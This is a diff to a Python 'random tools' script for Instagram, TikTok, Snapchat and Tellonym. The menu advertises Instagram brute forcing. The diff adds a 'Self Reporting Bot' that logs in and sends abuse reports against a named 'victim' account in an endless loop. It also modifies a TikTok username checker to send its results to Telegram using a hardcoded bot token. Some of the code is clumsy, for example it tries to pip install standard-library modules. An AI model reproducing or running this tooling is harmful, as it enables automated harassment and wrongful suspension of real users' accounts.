@@ -67,12 +67,13 @@ Department of random tools :
 12 >> Brute Force insta automatic
 13 >> Check the number in the snapchat
 ( Tools will be added soon )
+14 >> Self Reporting Bot ( IG )
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 ^ Checker section ^ :
-14 >> Checker TIKTOK 
-15 >> Checker InstaGram
-16 >> Checker SnapChat
-17 >> Checker Tellonym 
+15 >> Checker TIKTOK 
+16 >> Checker InstaGram
+17 >> Checker SnapChat
+18 >> Checker Tellonym 
 
 ••••••••••••••••••••••••••••••••••••••••""")
 def main():
@@ -1250,12 +1251,12 @@ And run the tool will automatically guess the accounts ...
 		os.system('pip install requests')
 		time.sleep(1)
 		jok = """
-███████ ███    ██  █████  ██████          
-██      ████   ██ ██   ██ ██   ██         
-███████ ██ ██  ██ ███████ ██████          
-     ██ ██  ██ ██ ██   ██ ██              
-███████ ██   ████ ██   ██ ██ ██           
-                                          
+███████ ███    ██  █████  ██████          
+██      ████   ██ ██   ██ ██   ██         
+███████ ██ ██  ██ ███████ ██████          
+     ██ ██  ██ ██ ██   ██ ██              
+███████ ██   ████ ██   ██ ██ ██           
+                                          
 <---------------------------------------->
         |   Alert tool is free   |
         |                        |
@@ -1297,24 +1298,123 @@ The function of the tool informs you if the number is related to snapchat or not
 		check()
 		print('')
 		input("press enter to close the program.")
-#مالك شغل	
-	elif n == '14':
-		import requests
+#مالك شغل:
+	elif ooi == '14':
 		import os
+		import uuid
+		import time
+		import secrets
+		import requests
+		import sys as n
+		import time as mm
+		from time import sleep
+		uid = uuid.uuid4()
+		r = requests.Session()
+		cookie = secrets.token_hex(8)*2
 		os.system('pip install os')
+		os.system('pip install sys')
+		os.system('pip install uuid')
+		os.system('pip install secrets')
 		os.system('pip install requests')
-		RIG = """
-
-<---------------------------------------->
-        | (𝑇) Alert tool is free  |
-        |   The tool needs a VPN  |
-        |     JOKER and 𝙿𝙰𝙽𝙰𝙳𝙾𝙻    |
-You have to create a file in the name of the username.txt and put the accounts inside it
-<---------------------------------------->
-"""
-		print(RIG)
-		username = input("[!] Type the name of the file that contains the accounts -> : ")
-		use = username
+		def slow(M):
+			for c in M + '\n':
+				n.stdout.write(c)
+				n.stdout.flush()
+				mm.sleep(1. / 120)
+		slow("""
+███████╗███████╗██╗     ███████╗    
+██╔════╝██╔════╝██║     ██╔════╝    
+███████╗█████╗  ██║     █████╗      
+╚════██║██╔══╝  ██║     ██╔══╝      
+███████║███████╗███████╗██║         
+╚══════╝╚══════╝╚══════╝╚═╝         
+                    ╦ ╔═╗ ╦╔═ ╔═╗ ╦═╗
+                    ║ ║ ║ ╠╩╗ ║╣  ╠╦╝
+                   ╚╝ ╚═╝ ╩ ╩ ╚═╝ ╩╚═
+           Self Reporting Bot
+""")	
+		print('Please login with a dummy account')	
+		print('___________________________________')
+		print(" ")
+		time.sleep(1)
+		username = input('>> you user : ')
+		time.sleep(1)
+		password = input('>> you pass : ')
+		print(" ")
+		print('           please wait')
+		time.sleep(1)
+		def login():
+			url = 'https://www.instagram.com/accounts/login/ajax/'
+			headers = {"user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36', 'x-csrftoken': 'missing', 'mid': cookie}
+			data = {
+				'username': username,
+				'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
+				'queryParams': '{}',
+				'optIntoOneTap': 'false',}
+			req_login = r.post(url,headers=headers,data=data)
+			
+			if ("userId") in req_login.text:
+				r.headers.update({'X-CSRFToken': req_login.cookies['csrftoken']})
+				time.sleep(1)
+				print(" ")
+				print('>> Signed in \n')
+				print(" ")
+				time.sleep(1)
+				target = input('>> The victim : ')
+				time.sleep(1)
+				slep = int(input('       >> Sleep ? :'))
+				ul_id = 'https://www.instagram.com/{}/?__a=1'.format(target)
+				req_id = r.get(ul_id).json()
+				user_id = str(req_id['logging_page_id'])
+				id = user_id.split('_')[1]
+				done = 1
+				
+				while True:
+					url_report = 'https://www.instagram.com/users/{}/report/'.format(id)
+					datas = {'source_name':'','reason_id':2,'frx_context':''} 
+					report = r.post(url_report,data=datas)
+					print('[•] Done Self {}<'.format(done))
+					sleep(slep)
+					done += 1
+			else:
+				print("           _________________")
+				print('          |  Error Login .. |')
+				print('          |_________________|')
+				exit()
+		login()
+#مالك دخل
+	elif ooi == '15':
+		import os
+		import time
+		import requests
+		import sys as n
+		import time as mm
+		os.system('pip install os')
+		os.system('pip install sys')
+		os.system('pip install time')
+		os.system('pip install requests')
+		def slow(M):
+			for c in M + '\n':
+				n.stdout.write(c)
+				n.stdout.flush()
+				mm.sleep(1. / 120)
+		slow("""
+        ╔╦╗ ╦ ╦╔═ ╔╦╗ ╔═╗ ╦╔═  
+         ║  ║ ╠╩╗  ║  ║ ║ ╠╩╗  
+         ╩  ╩ ╩ ╩  ╩  ╚═╝ ╩ ╩ 
+                | Checker |
+                 ---------""")
+		print("""
+The VPN must be running before starting
+Create a new folder named username.txt
+Put the username you want to check
+Accounts will be sent to Telegram
+Enter this bot @ios11_bot and click start
+""")
+		print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
+		time.sleep(2)
+		joker = input(">> Entet you ID : ")
+		jok = 'username.txt'
 		headers = {
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
@@ -1324,25 +1424,31 @@ You have to create a file in the name of the username.txt and put the accounts i
             "Cache-Control": "max-age=0"
 }
 		
-		
-		file = open(username, "r")
+		tok = ('1401074229:AAFObCSdKqIeCbYj95bufmNL-YfJCyFRa8M')
+		ok = """
+〰️〰️〰️〰️〰️〰️〰️〰️
+[•] USER TIKTOK 🥳👇🏻
+〰️〰️〰️〰️〰️〰️〰️〰️"""
+		mon = """〰️〰️〰️〰️〰️〰️〰️〰️
+[•] @vv1ck ( JOKER )
+"""
+		file = open(jok, "r")
 		while True:
 			Check = file.readline().split('\n')[0]
 			tiklog = f'https://www.tiktok.com/@{Check}'
 			rq = requests.get(tiklog, headers=headers)
 			if rq.status_code == 404:
-				print("|==============================|")
-				print("[√] This account is not used -> : " + Check)
+				print(">> Available >> " + Check)
+				tlg =(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={joker}&text={ok}\n[√] user > : {Check}\n{mon}')
+				
+				r = requests.post(tlg)
 			elif rq.status_code == 200:
-				print("|==============================|")
-				print("[!] This account is used -> : " + Check)
-			if (Check == ""):
-				break
-
+				print(">> Not available > " + Check)
+				if (Check == ""):
+					break
 #مالك شغل
 	
-	
-	elif ooi == '15':
+	elif ooi == '16':
 		import requests
 		import os
 		import time
@@ -1416,7 +1522,7 @@ You have to create a file in the name of the user.txt and put the accounts insid
 				break
 		
 	
-	elif ooi == '16':
+	elif ooi == '17':
 		import requests
 		import time as mm
 		import sys as n
@@ -1468,7 +1574,7 @@ You have to create a file in the name of the UserFound.txt and put the accounts 
 			getUser(line)	
 	
 	
-	elif ooi == '17':
+	elif ooi == '18':
 		import requests
 		import os
 		from colored import fg
